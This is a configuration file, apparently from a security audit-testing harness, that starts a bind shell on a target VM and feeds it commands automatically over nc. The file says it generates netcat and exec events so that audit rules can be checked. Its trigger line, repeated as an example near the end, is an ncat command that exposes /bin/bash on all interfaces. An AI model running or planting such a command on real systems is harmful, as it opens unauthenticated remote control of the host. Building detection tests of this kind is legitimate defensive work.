# deliveries/bind_shell/bash_auto.conf
#
# Starts a bind shell on the target VM, then automatically connects to it
# from the controller using bash/nc and feeds commands into the session.
#
# This delivery vector is intended for:
#
#   - Linux controller systems
#   - native Linux hosts
#   - WSL environments where nc behaves reliably
#
# The wrapper:
#
#   1. starts a bind shell on the target
#   2. waits for the listener to become available
#   3. connects using nc
#   4. feeds commands automatically
#   5. records a transcript
#
# This is the most reproducible bind-shell delivery mode.

NAME="bind_shell_bash_auto"

TYPE="bind_shell"

CONTROLLER="bash"

AUTOMATED="true"

# Target-side bind shell settings
TARGET_HOST="${TARGET_HOST:-}"

LPORT="${LPORT:-4444}"

# Target-side bind-shell trigger.
#
# This starts a listener on the target VM that exposes /bin/bash.
#
# NOTE:
#   Depending on the target VM, nc may not support -e.
#   Payloads may need to override this with a different implementation.
TRIGGER_COMMAND='ncat -l 0.0.0.0 ${LPORT} -e /bin/bash'

# Optional trigger script override.
TRIGGER_SCRIPT=""

# Automated command execution.
#
# Commands from COMMANDS_FILE are piped directly into the bind shell.
COMMANDS_FILE="commands.txt"

# Timing controls
SHELL_START_DELAY="2"
SHELL_CONNECT_DELAY="3"
POST_COMMAND_DELAY="1"

# Transcript recording
CAPTURE_TRANSCRIPT="true"
TRANSCRIPT_FILE="shell_transcript.log"

# Marker behavior
#
# START marker:
#   sent immediately before starting the bind shell
#
# END marker:
#   sent after automated commands complete
#
SEND_MARKERS_AROUND_TRIGGER="true"

# Cleanup behavior
KILL_BIND_SHELL_AFTER_RUN="true"

# Required controller tools
REQUIRED_COMMANDS=(
    bash
    nc
    ssh
)

# Required target tools
TARGET_REQUIRED_COMMANDS=(
    ncat
    bash
)

# Audit relevance:
#
# This vector intentionally generates:
#
#   - netcat
#   - shell_exec
#   - exec
#
# and potentially:
#
#   - network_connect
#
# depending on audit rules and bind-shell implementation.

AUDIT_RELEVANT="true"

# Intended workflow:
#
#   1. Wrapper sends START marker
#   2. Wrapper starts bind shell on target
#   3. Wrapper connects with nc
#   4. Commands are fed automatically
#   5. Transcript is recorded
#   6. Wrapper sends END marker
#
# Example target-side bind shell:
#
#   ncat -l 0.0.0.0 4444 -e /bin/bash
#
# Example controller-side client:
#
#   nc TARGET_HOST 4444
#
